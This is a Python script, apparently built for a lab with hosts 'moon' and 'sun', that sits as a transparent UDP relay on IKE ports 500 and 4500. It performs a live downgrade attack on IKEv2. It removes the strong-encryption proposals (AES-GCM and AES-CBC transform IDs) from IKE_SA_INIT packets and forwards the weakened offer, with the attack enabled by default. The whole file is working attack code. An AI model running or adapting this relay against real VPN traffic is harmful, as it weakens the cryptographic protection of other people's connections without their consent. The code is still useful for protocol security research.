"""Live downgrade-attack relay. Transparent UDP relay between moon and sun;
strips the strong proposal from IKE_SA_INIT only when ATTACK=on."""
import socket, struct, sys, threading, os

EXCHANGE_IKE_SA_INIT = 34
PAYLOAD_SA = 33
STRONG_ENCR_IDS = {20, 18, 12}

def parse_ike_header(pkt):
    if len(pkt) < 28: return None
    spi_i, spi_r, next_payload, ver, exch_type, flags, msg_id, length = struct.unpack(
        "!8s8sBBBBII", pkt[:28])
    return {"next_payload": next_payload, "exch_type": exch_type, "length": length}

def walk_proposals(sa_body):
    off, proposals = 0, []
    while off + 8 <= len(sa_body):
        next_p, resv, length, prop_num, proto, spi_sz, n_trans = struct.unpack(
            "!BBHBBBB", sa_body[off:off+8])
        end = off + length
        toff, encr_ids = off + 8 + spi_sz, []
        while toff < end:
            t_next, t_resv, t_len, t_type, t_resv2, t_id = struct.unpack(
                "!BBHBBH", sa_body[toff:toff+8])
            if t_type == 1: encr_ids.append(t_id)
            if t_len <= 0: break
            toff += t_len
        proposals.append({"start": off, "end": end, "encr_ids": encr_ids})
        if length <= 0: break
        off = end
    return proposals

def strip_strong_proposals(sa_payload):
    gen_next, gen_flags, gen_len = struct.unpack("!BBH", sa_payload[:4])
    body = sa_payload[4:]
    proposals = walk_proposals(body)
    keep = [p for p in proposals if not (set(p["encr_ids"]) & STRONG_ENCR_IDS)]
    if not keep or len(keep) == len(proposals):
        return sa_payload, False
    new_body = bytearray()
    for i, p in enumerate(keep):
        chunk = bytearray(body[p["start"]:p["end"]])
        chunk[0] = 0 if i == len(keep)-1 else 2
        new_body += chunk
    new_sa = struct.pack("!BBH", gen_next, gen_flags, 4+len(new_body)) + bytes(new_body)
    return new_sa, True

def process_ike_sa_init(pkt):
    if os.environ.get("ATTACK", "on") != "on":
        return pkt, False
    hdr = parse_ike_header(pkt)
    if not hdr or hdr["exch_type"] != EXCHANGE_IKE_SA_INIT: return pkt, False
    if hdr["next_payload"] != PAYLOAD_SA: return pkt, False
    body = pkt[28:]
    gen_next, gen_flags, sa_len = struct.unpack("!BBH", body[:4])
    sa_payload, rest = body[:sa_len], body[sa_len:]
    new_sa, changed = strip_strong_proposals(sa_payload)
    if not changed: return pkt, False
    new_body = new_sa + rest
    new_hdr = pkt[:24] + struct.pack("!I", 28 + len(new_body))
    return new_hdr + new_body, True

def relay(listen_port, forward_host, forward_port, label):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", listen_port))
    mode = os.environ.get("ATTACK", "on")
    print(f"[{label}] listening :{listen_port} -> {forward_host}:{forward_port} (ATTACK={mode})", flush=True)
    while True:
        data, addr = sock.recvfrom(65535)
        mutated, changed = process_ike_sa_init(data)
        if changed:
            print(f"[{label}] IKE_SA_INIT from {addr} -- STRONG PROPOSAL STRIPPED "
                  f"({len(data)}B -> {len(mutated)}B)", flush=True)
        sock.sendto(mutated, (forward_host, forward_port))

if __name__ == "__main__":
    sun_ip = sys.argv[1] if len(sys.argv) > 1 else "10.10.0.20"
    threading.Thread(target=relay, args=(500, sun_ip, 500, "ike"), daemon=True).start()
    relay(4500, sun_ip, 4500, "nat-t")
